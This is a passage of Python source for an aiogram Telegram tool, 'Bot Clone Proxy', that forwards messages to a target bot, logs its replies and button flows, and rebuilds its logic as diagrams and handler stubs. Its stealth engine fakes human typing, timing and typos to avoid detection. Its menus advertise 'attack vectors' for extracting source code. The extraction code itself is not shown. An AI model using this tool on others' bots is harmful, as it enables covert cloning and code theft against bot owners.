        stubs.append("def setup_handlers(dp: Dispatcher):")
        stubs.append('    """Register all handlers with the dispatcher"""')
        stubs.append("    dp.include_router(router)")
        stubs.append("")
        
        return "\n".join(stubs)

# ============================================================================
# HANDLERS
# ============================================================================

@router.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    """Start command - show warning and main menu"""
    await state.set_state(CloneStates.main_menu)
    
    # Initialize user settings if not exists
    if message.from_user.id not in user_settings:
        user_settings[message.from_user.id] = {"stealth_level": "balanced"}
    
    # Check if user has accepted warning
    user_data = await state.get_data()
    if not user_data.get("accepted_warning", False):
        warning_text = (
            "╔════════════════════════════════════════════════════════════╗\n"
            "║                    ⚠️ LEGAL WARNING ⚠️                      ║\n"
            "╚════════════════════════════════════════════════════════════╝\n\n"
            "This tool is for **EDUCATIONAL PURPOSES** and **AUTHORIZED TESTING** ONLY.\n\n"
            "❌ **UNAUTHORIZED USE IS ILLEGAL** and violates:\n"
            "• Computer Fraud and Abuse Act (CFAA)\n"
            "• EU Cybercrime Directive\n"
            "• Telegram Terms of Service\n"
            "• Intellectual Property laws worldwide\n"
            "• Data protection regulations (GDPR, CCPA)\n\n"
            "⚠️ **YOU MUST HAVE EXPLICIT WRITTEN PERMISSION** from the bot owner.\n\n"
            "**PENALTIES** for unauthorized use include:\n"
            "• Criminal charges (felony in many jurisdictions)\n"
            "• Fines up to $500,000\n"
            "• Imprisonment up to 10 years\n"
            "• Civil liability for damages\n\n"
            "By clicking **I UNDERSTAND**, you confirm:\n"
            "✅ You have EXPLICIT PERMISSION from the bot owner\n"
            "✅ You are ONLY testing your OWN bots\n"
            "✅ You accept FULL LEGAL RESPONSIBILITY\n"
            "✅ You will not use this for illegal purposes\n\n"
            "_This is your only warning._"
        )
        
        await message.answer(
            f"<b>⚠️ WARNING ⚠️</b>\n\n<code>{warning_text}</code>",
            parse_mode="HTML",
            reply_markup=UIComponents.confirm_warning()
        )
    else:
        await show_main_menu(message, state)

async def show_main_menu(message: types.Message, state: FSMContext):
    """Show main menu"""
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    
    welcome_text = (
        f"🤖 <b>Bot Clone Proxy v{VERSION}</b>\n\n"
        f"🛡️ <b>Stealth Mode:</b> {stealth_level.upper()}\n"
        f"👤 <b>User ID:</b> <code>{message.from_user.id}</code>\n\n"
        f"<i>Select an option below:</i>"
    )
    
    await message.answer(
        welcome_text,
        parse_mode="HTML",
        reply_markup=UIComponents.main_menu()
    )

@router.callback_query(F.data == "ack_legal_warning")
async def ack_warning(callback: CallbackQuery, state: FSMContext):
    """Acknowledge legal warning"""
    await state.update_data(accepted_warning=True)
    await callback.message.delete()
    await show_main_menu(callback.message, state)
    await callback.answer()

@router.callback_query(F.data == "menu_main")
async def main_menu(callback: CallbackQuery, state: FSMContext):
    """Return to main menu"""
    await state.set_state(CloneStates.main_menu)
    
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    
    welcome_text = (
        f"🤖 <b>Bot Clone Proxy v{VERSION}</b>\n\n"
        f"🛡️ <b>Stealth Mode:</b> {stealth_level.upper()}\n"
        f"👤 <b>User ID:</b> <code>{callback.from_user.id}</code>\n\n"
        f"<i>Select an option below:</i>"
    )
    
    await callback.message.edit_text(
        welcome_text,
        parse_mode="HTML",
        reply_markup=UIComponents.main_menu()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_help")
async def show_help(callback: CallbackQuery, state: FSMContext):
    """Show help information"""
    help_text = (
        "📚 <b>Bot Clone Proxy Help</b>\n\n"
        "<b>Features:</b>\n"
        "• <b>Add Target Bot</b> - Add a new bot to analyze\n"
        "• <b>Clone Session</b> - Proxy messages through target\n"
        "• <b>Attack Vectors</b> - Attempt code extraction\n"
        "• <b>View Leaks</b> - See recovered code fragments\n"
        "• <b>Export Data</b> - Save results (JSON, diagrams, stubs)\n\n"
        "<b>How to use:</b>\n"
        "1. Add a target bot (@username)\n"
        "2. Start clone session to record behavior\n"
        "3. Interact naturally with the bot\n"
        "4. Use attack vectors to attempt leaks\n"
        "5. Export results when done\n\n"
        "<b>⚠️ Important Notes:</b>\n"
        "• Source code extraction is RARELY possible\n"
        "• Most vectors are patched by 2026\n"
        "• Focus is on behavioral cloning\n"
        "• Rate limits apply to all operations"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Main Menu", callback_data="menu_main"))
    
    await callback.message.edit_text(
        help_text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_reset")
async def reset_bot(callback: CallbackQuery, state: FSMContext):
    """Reset bot state"""
    await state.clear()
    await state.set_state(CloneStates.main_menu)
    
    # Reset user settings
    if callback.from_user.id in user_settings:
        user_settings[callback.from_user.id] = {"stealth_level": "balanced"}
    
    await callback.message.edit_text(
        "✅ <b>Bot reset successfully!</b>\n\nRestarting...",
        parse_mode="HTML"
    )
    await asyncio.sleep(1)
    await cmd_start(callback.message, state)
    await callback.answer()

@router.callback_query(F.data == "menu_exit")
async def exit_bot(callback: CallbackQuery, state: FSMContext):
    """Exit the bot"""
    await callback.message.edit_text(
        "👋 <b>Goodbye!</b>\n\nUse /start to restart the bot.",
        parse_mode="HTML"
    )
    await state.clear()
    await callback.answer()

@router.callback_query(F.data == "menu_add_target")
async def add_target_prompt(callback: CallbackQuery, state: FSMContext):
    """Prompt to add new target bot"""
    await state.set_state(CloneStates.adding_target)
    
    text = (
        "📝 <b>Add Target Bot</b>\n\n"
        "Send me the bot's username (with or without @):\n\n"
        "<b>Examples:</b>\n"
        "• <code>@example_bot</code>\n"
        "• <code>example_bot</code>\n\n"
        "Or send /cancel to abort."
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Cancel", callback_data="menu_main"))
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.message(CloneStates.adding_target)
async def process_add_target(message: types.Message, state: FSMContext):
    """Process new target bot addition"""
    username = message.text.strip()
    
    # Remove @ if present
    if username.startswith('@'):
        username = username[1:]
    
    # Validate username format
    if not re.match(r'^[a-zA-Z0-9_]{5,32}$', username):
        await message.answer(
            "❌ <b>Invalid bot username format</b>\n\n"
            "Requirements:\n"
            "• 5-32 characters\n"
            "• Letters (a-z, A-Z)\n"
            "• Numbers (0-9)\n"
            "• Underscore (_)\n\n"
            "Try again or use the button below to cancel:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔙 Cancel", callback_data="menu_main")
            ).as_markup()
        )
        return
    
    # Save to database
    bot_id = db.add_target_bot(username, {"added_by": message.from_user.id, "added_at": datetime.now().isoformat()})
    
    if bot_id:
        success_text = (
            f"✅ <b>Bot @{username} added successfully!</b>\n\n"
            f"📊 <b>Bot ID:</b> <code>{bot_id}</code>\n\n"
            f"<b>Next steps:</b>\n"
            f"• Start a clone session to record behavior\n"
            f"• Run attack vectors to attempt leaks\n"
            f"• View statistics as data accumulates"
        )
    else:
        success_text = f"✅ <b>Bot @{username} already exists in database!</b>"
    
    await message.answer(
        success_text,
        parse_mode="HTML",
        reply_markup=UIComponents.main_menu()
    )
    await state.set_state(CloneStates.main_menu)

@router.callback_query(F.data == "menu_list_bots")
async def list_bots(callback: CallbackQuery, state: FSMContext):
    """List all target bots with pagination"""
    bots = db.get_target_bots(limit=100)
    
    if not bots:
        await callback.message.edit_text(
            "📭 <b>No bots added yet.</b>\n\n"
            "Use 'Add Target Bot' to get started.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="menu_main")
            ).as_markup()
        )
        await callback.answer()
        return
    
    # Store bots in state for pagination
    await state.update_data(bots_list=bots, current_page=0)
    
    # Show first page
    text = "📋 <b>Your Target Bots</b>\n\n"
    for bot in bots[:5]:
        last_active = bot.get('last_active', 'Never')
        if last_active and last_active != 'Never':
            try:
                last_active = datetime.fromisoformat(last_active).strftime('%Y-%m-%d')
            except:
                pass
        
        text += f"• <b>@{bot['username']}</b>\n"
        text += f"  ├ Interactions: {bot['total_interactions']}\n"
        text += f"  └ Last active: {last_active}\n\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=UIComponents.bot_list(bots, 0)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("bots_page_"))
async def paginate_bots(callback: CallbackQuery, state: FSMContext):
    """Handle bot list pagination"""
    page = int(callback.data.split("_")[2])
    user_data = await state.get_data()
    bots = user_data.get("bots_list", [])
    
    if not bots:
        await callback.answer("No bots found", show_alert=True)
        return
    
    # Show requested page
    items_per_page = 8
    start = page * items_per_page
    end = start + items_per_page
    page_bots = bots[start:end]
    
    text = f"📋 <b>Your Target Bots (Page {page + 1}/{(len(bots)-1)//items_per_page + 1})</b>\n\n"
    for bot in page_bots:
        last_active = bot.get('last_active', 'Never')
        if last_active and last_active != 'Never':
            try:
                last_active = datetime.fromisoformat(last_active).strftime('%Y-%m-%d')
            except:
                pass
        
        text += f"• <b>@{bot['username']}</b> - {bot['total_interactions']} msgs\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=UIComponents.bot_list(bots, page)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("select_bot_"))
async def select_bot(callback: CallbackQuery, state: FSMContext):
    """Select a specific bot for action"""
    bot_id = int(callback.data.split("_")[2])
    
    # Get bot details
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    username = bot_info['username']
    
    # Store selected bot in state
    await state.update_data(selected_bot_id=bot_id, selected_bot_username=username)
    
    # Get stats for display
    stats = db.get_bot_statistics(bot_id)
    
    info_text = (
        f"🤖 <b>@{username}</b>\n\n"
        f"<b>Statistics:</b>\n"
        f"• Interactions: {bot_info['total_interactions']}\n"
        f"• Avg Response: {stats.get('avg_response', 0):.2f}s\n"
        f"• Button Flows: {stats.get('flow_stats', {}).get('total_flows', 0)}\n"
        f"• Patterns: {len(stats.get('pattern_stats', {}))}\n"
        f"• Code Fragments: {stats.get('code_fragments', 0)}\n\n"
        f"<b>Select action:</b>"
    )
    
    await callback.message.edit_text(
        info_text,
        parse_mode="HTML",
        reply_markup=UIComponents.bot_action_menu(bot_id, username)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("clone_"))
async def start_clone_session(callback: CallbackQuery, state: FSMContext):
    """Start cloning session for selected bot"""
    bot_id = int(callback.data.split("_")[1])
    
    # Get bot details
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    username = bot_info['username']
    
    # Create session in database
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    session_uuid = db.create_session(callback.from_user.id, bot_id, stealth_level)
    
    if not session_uuid:
        await callback.answer("Error creating session!", show_alert=True)
        return
    
    # Initialize stealth engine for this user if not exists
    if callback.from_user.id not in user_stealth_engines:
        user_stealth_engines[callback.from_user.id] = StealthEngine(callback.from_user.id, stealth_level)
    
    # Store session info in memory
    active_sessions[callback.from_user.id] = {
        "session_uuid": session_uuid,
        "target_bot_id": bot_id,
        "target_username": username,
        "stealth": user_stealth_engines[callback.from_user.id],
        "processor": MessageProcessor(bot_id),
        "start_time": datetime.now(),
        "interactions": 0,
        "last_state": "initial",
        "paused": False
    }
    
    await state.set_state(CloneStates.cloning_session)
    
    # Send welcome message with instructions
    welcome_text = (
        f"🔄 <b>Clone Session Started</b>\n\n"
        f"<b>Target:</b> @{username}\n"
        f"<b>Stealth Level:</b> {stealth_level.upper()}\n"
        f"<b>Session ID:</b> <code>{session_uuid[:8]}...</code>\n\n"
        f"📋 <b>Instructions:</b>\n"
        f"• Every message you send will be forwarded to @{username}\n"
        f"• All responses will be captured and analyzed\n"
        f"• Inline buttons will be intercepted and processed\n"
        f"• Media will be cached for efficiency\n"
        f"• Timing patterns will be recorded\n\n"
        f"<i>Use the controls below to manage the session.</i>"
    )
    
    await callback.message.edit_text(
        welcome_text,
        parse_mode="HTML",
        reply_markup=UIComponents.clone_session_controls(username, session_uuid[:8])
    )
    await callback.answer()

@router.callback_query(F.data.startswith("pause_"))
async def pause_session(callback: CallbackQuery):
    """Pause clone session"""
    session_id = callback.data.split("_")[1]
    
    if callback.from_user.id in active_sessions:
        active_sessions[callback.from_user.id]["paused"] = True
        
        await callback.message.edit_text(
            "⏸️ <b>Session Paused</b>\n\n"
            "Messages will not be forwarded until resumed.\n"
            "Use /start to resume.",
            parse_mode="HTML"
        )
    await callback.answer()

@router.callback_query(F.data.startswith("stop_"))
async def stop_session(callback: CallbackQuery, state: FSMContext):
    """Stop clone session"""
    session_id = callback.data.split("_")[1]
    
    if callback.from_user.id in active_sessions:
        session_info = active_sessions.pop(callback.from_user.id)
        
        # End session in database
        db.end_session(session_info["session_uuid"])
        
        duration = datetime.now() - session_info["start_time"]
        
        await callback.message.edit_text(
            f"⏹️ <b>Session Stopped</b>\n\n"
            f"<b>Statistics:</b>\n"
            f"• Duration: {duration.seconds // 60}m {duration.seconds % 60}s\n"
            f"• Interactions: {session_info['interactions']}\n"
            f"• Final State: {session_info['last_state']}\n\n"
            f"Data has been saved to database.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="menu_main")
            ).as_markup()
        )
    
    await callback.answer()

@router.message(CloneStates.cloning_session)
async def handle_clone_message(message: types.Message, state: FSMContext, bot: Bot):
    """Handle messages during clone session - forward to target"""
    session_info = active_sessions.get(message.from_user.id)
    if not session_info or session_info.get("paused", False):
        return
    
    try:
        stealth: StealthEngine = session_info["stealth"]
        processor: MessageProcessor = session_info["processor"]
        target_bot = session_info["target_username"]
        target_bot_id = session_info["target_bot_id"]
        
        # Record start time for response time calculation
        start_time = time.time()
        
        # Pre-send delay
        await stealth.pre_send_delay(target_bot_id, session_info["last_state"])
        
        # Simulate typing if it's a text message
        if message.text:
            await stealth.simulate_typing(bot, message.chat.id, len(message.text))
        
        # Apply stealth modifications if configured
        text_to_send = message.text
        if message.text and stealth.should_simulate_error():
            text_to_send = stealth.get_modified_text(message.text)
        
        # Send message to target
        if message.text:
            await bot.send_message(
                chat_id=f"@{target_bot}",
                text=text_to_send
            )
            
            # Calculate response time
            response_time_ms = int((time.time() - start_time) * 1000)
            
            # Record interaction
            db.add_interaction({
                "session_id": session_info["session_uuid"],
                "target_bot_id": target_bot_id,
                "direction": "user_to_target",
                "message_type": "text",
                "response_time_ms": response_time_ms,
                "raw_data": {
                    "text": text_to_send,
                    "original_text": message.text,
                    "modified": text_to_send != message.text
                }
            })
            
            # Update bot stats
            db.update_bot_stats(target_bot_id, response_time_ms, True)
            
            # Increment interaction count
            session_info["interactions"] += 1
            
            # Acknowledge to user
            await message.reply(
                f"✅ <b>Forwarded to @{target_bot}</b>\n"
                f"<i>Waiting for response...</i>",
                parse_mode="HTML",
                disable_notification=True
            )
            
        # Handle other message types
        elif message.photo:
            photo = message.photo[-1]
            
            # Check cache
            file_hash = hashlib.md5(f"{photo.file_id}_{photo.file_size}".encode()).hexdigest()
            cursor = db.execute(
                "SELECT file_id FROM media_cache WHERE file_hash = ?",
                (file_hash,)
            )
            cached = cursor.fetchone()
            
            if cached:
                await bot.send_photo(chat_id=f"@{target_bot}", photo=cached[0])
            else:
                await bot.send_photo(chat_id=f"@{target_bot}", photo=photo.file_id)
                
                db.execute(
                    "INSERT INTO media_cache (file_hash, file_id, file_type, file_size, first_seen) VALUES (?, ?, ?, ?, ?)",
                    (file_hash, photo.file_id, "photo", photo.file_size, datetime.now().isoformat())
                )
                db.commit()
            
            await message.reply(f"✅ Photo forwarded to @{target_bot}", disable_notification=True)
            session_info["interactions"] += 1
            
        else:
            await message.reply(
                f"⚠️ Message type {message.content_type} forwarding not fully implemented",
                disable_notification=True
            )
        
    except Exception as e:
        logger.error(f"Error forwarding message: {e}", exc_info=True)
        await message.reply(
            f"❌ <b>Error forwarding message:</b>\n<code>{str(e)[:200]}</code>",
            parse_mode="HTML"
        )

@router.callback_query(CloneStates.cloning_session)
async def handle_clone_callback(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Handle callback queries during clone session"""
    session_info = active_sessions.get(callback.from_user.id)
    if not session_info or session_info.get("paused", False):
        await callback.answer("Session not active")
        return
    
    target_bot_id = session_info["target_bot_id"]
    
    try:
        # Record button press
        db.add_button_flow({
            "target_bot_id": target_bot_id,
            "from_state": session_info["last_state"],
            "button_text": callback.data,
            "button_callback_data": callback.data,
            "to_state": "unknown",
            "response_type": "callback",
            "confidence": 0.7
        })
        
        await callback.answer("✅ Callback recorded")
        
    except Exception as e:
        logger.error(f"Error handling callback: {e}")
        await callback.answer(f"Error: {str(e)}", show_alert=True)

@router.callback_query(F.data == "menu_stats")
async def view_global_statistics(callback: CallbackQuery, state: FSMContext):
    """View overall statistics"""
    
    # Get global stats
    cursor = db.execute("SELECT COUNT(*) FROM target_bots")
    row = cursor.fetchone()
    bot_count = row[0] if row else 0
    
    cursor = db.execute("SELECT COUNT(*) FROM interactions")
    row = cursor.fetchone()
    interaction_count = row[0] if row else 0
    
    cursor = db.execute("SELECT COUNT(*) FROM button_flows")
    row = cursor.fetchone()
    flow_count = row[0] if row else 0
    
    cursor = db.execute("SELECT COUNT(DISTINCT pattern_type) FROM patterns")
    row = cursor.fetchone()
    pattern_count = row[0] if row else 0
    
    cursor = db.execute("SELECT COUNT(*) FROM code_fragments")
    row = cursor.fetchone()
    fragment_count = row[0] if row else 0
    
    cursor = db.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
    row = cursor.fetchone()
    active_sessions_count = row[0] if row else 0
    
    cursor = db.execute("SELECT AVG(avg_response_time) FROM target_bots WHERE avg_response_time > 0")
    row = cursor.fetchone()
    avg_response = row[0] if row else 0
    
    stats_text = (
        f"📊 <b>Global Statistics</b>\n\n"
        f"<b>Bots:</b>\n"
        f"• Total Bots: {bot_count}\n"
        f"• Active Sessions: {active_sessions_count}\n\n"
        f"<b>Interactions:</b>\n"
        f"• Total: {interaction_count}\n"
        f"• Avg Response: {avg_response:.2f}s\n"
        f"• Button Flows: {flow_count}\n\n"
        f"<b>Intelligence:</b>\n"
        f"• Patterns Detected: {pattern_count}\n"
        f"• Code Fragments: {fragment_count}\n\n"
        f"<i>Select a bot for detailed stats or export.</i>"
    )
    
    # Get bot list for quick selection
    bots = db.get_target_bots(limit=5)
    builder = InlineKeyboardBuilder()
    
    for bot in bots:
        builder.row(InlineKeyboardButton(
            text=f"📊 @{bot['username']}",
            callback_data=f"stats_bot_{bot['id']}"
        ))
    
    builder.row(
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="menu_main")
    )
    
    await callback.message.edit_text(
        stats_text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("stats_bot_"))
async def view_bot_statistics(callback: CallbackQuery, state: FSMContext):
    """View statistics for specific bot"""
    bot_id = int(callback.data.split("_")[2])
    
    # Get bot info
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    # Get detailed stats
    stats = db.get_bot_statistics(bot_id)
    
    stats_text = (
        f"📊 <b>Statistics: @{bot_info['username']}</b>\n\n"
        f"<b>General:</b>\n"
        f"• Added: {bot_info.get('added_date', 'Unknown')[:10]}\n"
        f"• Last Active: {bot_info.get('last_active', 'Never')[:10] if bot_info.get('last_active') else 'Never'}\n"
        f"• Total Interactions: {bot_info['total_interactions']}\n"
        f"• Success Rate: {bot_info.get('success_rate', 0)*100:.1f}%\n\n"
        f"<b>Message Types:</b>\n"
    )
    
    for msg_type, count in stats.get('message_types', {}).items():
        stats_text += f"• {msg_type}: {count}\n"
    
    stats_text += f"\n<b>States & Flows:</b>\n"
    stats_text += f"• Detected States: {stats.get('flow_stats', {}).get('states', 0)}\n"
    stats_text += f"• Button Flows: {stats.get('flow_stats', {}).get('total_flows', 0)}\n"
    stats_text += f"• Avg Response: {stats.get('avg_response', 0):.2f}s\n\n"
    
    stats_text += f"<b>Patterns:</b>\n"
    for pattern_type, count in stats.get('pattern_stats', {}).items():
        stats_text += f"• {pattern_type}: {count}\n"
    
    stats_text += f"\n<b>Code Fragments:</b> {stats.get('code_fragments', 0)}\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="📤 Export Data", callback_data=f"export_bot_{bot_id}"),
        InlineKeyboardButton(text="🔄 Refresh", callback_data=f"stats_bot_{bot_id}")
    )
    builder.row(
        InlineKeyboardButton(text="🔙 Back to Stats", callback_data="menu_stats"),
        InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
    )
    
    await callback.message.edit_text(
        stats_text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_settings")
async def settings_menu(callback: CallbackQuery, state: FSMContext):
    """Show settings menu"""
    user_data = await state.get_data()
    current_level = user_data.get("stealth_level", "balanced")
    
    settings_text = (
        f"⚙️ <b>Settings</b>\n\n"
        f"<b>Current Configuration:</b>\n"
        f"• Stealth Level: {current_level.upper()}\n"
        f"• Multi-Session: {'Enabled' if STEALTH_LEVELS[current_level]['session_rotation'] else 'Disabled'}\n"
        f"• Max Actions/Min: {STEALTH_LEVELS[current_level]['max_actions_per_min']}\n\n"
        f"<i>Select option to modify:</i>"
    )
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=UIComponents.settings_menu(current_level)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("stealth_"))
async def set_stealth_level(callback: CallbackQuery, state: FSMContext):
    """Set stealth level"""
    level = callback.data.split("_")[1]
    
    # Validate level
    if level not in STEALTH_LEVELS:
        await callback.answer("Invalid stealth level!", show_alert=True)
        return
    
    # Update state
    await state.update_data(stealth_level=level)
    
    # Update user settings
    user_settings[callback.from_user.id]["stealth_level"] = level
    
    # Update stealth engine if exists
    if callback.from_user.id in user_stealth_engines:
        user_stealth_engines[callback.from_user.id] = StealthEngine(callback.from_user.id, level)
    
    await callback.answer(f"✅ Stealth level set to {level.upper()}")
    
    # Show updated settings menu
    await settings_menu(callback, state)

@router.callback_query(F.data == "settings_multisession")
async def toggle_multisession(callback: CallbackQuery, state: FSMContext):
    """Toggle multi-session rotation"""
    user_data = await state.get_data()
    current_level = user_data.get("stealth_level", "balanced")
    
    STEALTH_LEVELS[current_level]["session_rotation"] = not STEALTH_LEVELS[current_level]["session_rotation"]
    
    await callback.answer(f"Multi-session: {'Enabled' if STEALTH_LEVELS[current_level]['session_rotation'] else 'Disabled'}")
    await settings_menu(callback, state)

@router.callback_query(F.data == "view_sessions")
async def view_active_sessions(callback: CallbackQuery):
    """View all active clone sessions"""
    
    # Get sessions from database
    cursor = db.execute(
        """SELECT s.session_uuid, tb.username, s.start_time, s.interactions, s.stealth_level
           FROM sessions s
           JOIN target_bots tb ON s.target_bot_id = tb.id
           WHERE s.status = 'active' AND s.user_id = ?
           ORDER BY s.start_time DESC""",
        (callback.from_user.id,)
    )
    
    sessions = cursor.fetchall()
    
    if not sessions:
        text = "📭 <b>No active sessions</b>"
    else:
        text = "🟢 <b>Your Active Sessions</b>\n\n"
        for session in sessions[:5]:
            session_uuid, username, start_time, interactions, level = session
            try:
                start_str = datetime.fromisoformat(start_time).strftime('%H:%M:%S')
            except:
                start_str = start_time
            text += f"• <b>@{username}</b>\n"
            text += f"  ├ Started: {start_str}\n"
            text += f"  ├ Interactions: {interactions}\n"
            text += f"  └ Level: {level}\n\n"
    
    # Also show memory sessions
    if callback.from_user.id in active_sessions:
        mem_session = active_sessions[callback.from_user.id]
        text += f"\n<b>Current Memory Session:</b>\n"
        text += f"• @{mem_session['target_username']} - {mem_session['interactions']} interactions\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔙 Settings", callback_data="menu_settings"),
        InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
    )
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_export")
async def export_menu(callback: CallbackQuery, state: FSMContext):
    """Show export menu"""
    
    user_data = await state.get_data()
    selected_bot = user_data.get("selected_bot_username")
    
    export_text = (
        f"📤 <b>Export Data</b>\n\n"
        f"<b>Current Selection:</b> {f'@{selected_bot}' if selected_bot else 'None'}\n\n"
        f"<b>Export Options:</b>\n"
        f"• JSON - Raw interaction data\n"
        f"• Diagram - Mermaid flow chart\n"
        f"• Python Stubs - AIOgram handlers\n"
        f"• Full Report - Comprehensive analysis\n"
        f"• Export All - Everything combined\n\n"
        f"<i>Select export format:</i>"
    )
    
    await callback.message.edit_text(
        export_text,
        parse_mode="HTML",
        reply_markup=UIComponents.export_menu()
    )
    await callback.answer()

@router.callback_query(F.data == "export_json")
async def export_json(callback: CallbackQuery, state: FSMContext):
    """Export all data as JSON"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    await callback.answer("⏳ Generating JSON export...", show_alert=False)
    
    try:
        # Collect data
        bot_info = db.get_target_bot(bot_id)
        
        # Get interactions
        cursor = db.execute(
            "SELECT * FROM interactions WHERE target_bot_id = ? ORDER BY timestamp",
            (bot_id,)
        )
        interactions = [dict(row) for row in cursor.fetchall()]
        
        # Get button flows
        cursor = db.execute(
            "SELECT * FROM button_flows WHERE target_bot_id = ?",
            (bot_id,)
        )
        flows = [dict(row) for row in cursor.fetchall()]
        
        # Get patterns
        cursor = db.execute(
            "SELECT * FROM patterns WHERE target_bot_id = ?",
            (bot_id,)
        )
        patterns = [dict(row) for row in cursor.fetchall()]
        
        # Get code fragments
        cursor = db.execute(
            "SELECT * FROM code_fragments WHERE target_bot_id = ?",
            (bot_id,)
        )
        fragments = [dict(row) for row in cursor.fetchall()]
        
        # Build export data
        export_data = {
            "export_time": datetime.now().isoformat(),
            "version": VERSION,
            "bot": dict(bot_info) if bot_info else {},
            "statistics": db.get_bot_statistics(bot_id),
            "interactions": interactions,
            "button_flows": flows,
            "patterns": patterns,
            "code_fragments": fragments,
            "total_records": len(interactions) + len(flows) + len(patterns) + len(fragments)
        }
        
        # Save to file
        filename = f"export_{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = EXPORTS_DIR / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        # Send file
        await callback.message.answer_document(
            FSInputFile(filepath),
            caption=f"✅ JSON export for @{user_data.get('selected_bot_username')}\nRecords: {export_data['total_records']}"
        )
        
    except Exception as e:
        logger.error(f"Export error: {e}", exc_info=True)
        await callback.message.answer(f"❌ Export failed: {str(e)}")

@router.callback_query(F.data == "export_diagram")
async def export_diagram(callback: CallbackQuery, state: FSMContext):
    """Generate and export Mermaid diagram"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    await callback.answer("⏳ Generating flow diagram...", show_alert=False)
    
    try:
        reconstructor = StateMachineReconstructor(bot_id)
        await reconstructor.rebuild_from_history()
        diagram = reconstructor.generate_mermaid_diagram()
        
        # Save diagram
        filename = f"flow_{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mmd"
        filepath = EXPORTS_DIR / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(diagram)
        
        await callback.message.answer_document(
            FSInputFile(filepath),
            caption=f"✅ Mermaid flow diagram for @{user_data.get('selected_bot_username')}\n{len(reconstructor.states)} states, {len(reconstructor.transitions)} transitions"
        )
        
    except Exception as e:
        logger.error(f"Diagram export error: {e}", exc_info=True)
        await callback.message.answer(f"❌ Diagram generation failed: {str(e)}")

@router.callback_query(F.data == "export_stubs")
async def export_stubs(callback: CallbackQuery, state: FSMContext):
    """Generate and export Python stubs"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    await callback.answer("⏳ Generating Python stubs...", show_alert=False)
    
    try:
        reconstructor = StateMachineReconstructor(bot_id)
        await reconstructor.rebuild_from_history()
        stubs = reconstructor.generate_python_stubs()
        
        # Save stubs
        filename = f"stubs_{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        filepath = EXPORTS_DIR / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(stubs)
        
        # Send file
        await callback.message.answer_document(
            FSInputFile(filepath),
            caption=f"✅ Python stubs for @{user_data.get('selected_bot_username')}\n{len(reconstructor.states)} states reconstructed"
        )
        
    except Exception as e:
        logger.error(f"Stubs export error: {e}", exc_info=True)
        await callback.message.answer(f"❌ Stub generation failed: {str(e)}")

@router.callback_query(F.data == "export_report")
async def export_report(callback: CallbackQuery, state: FSMContext):
    """Generate comprehensive HTML report"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    await callback.answer("⏳ Generating comprehensive report...", show_alert=False)
    
    try:
        bot_info = db.get_target_bot(bot_id)
        stats = db.get_bot_statistics(bot_id)
        reconstructor = StateMachineReconstructor(bot_id)
        fsm_data = await reconstructor.rebuild_from_history()
        
        # Generate HTML report
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Bot Clone Report - @{bot_info['username']}</title>
    <style>
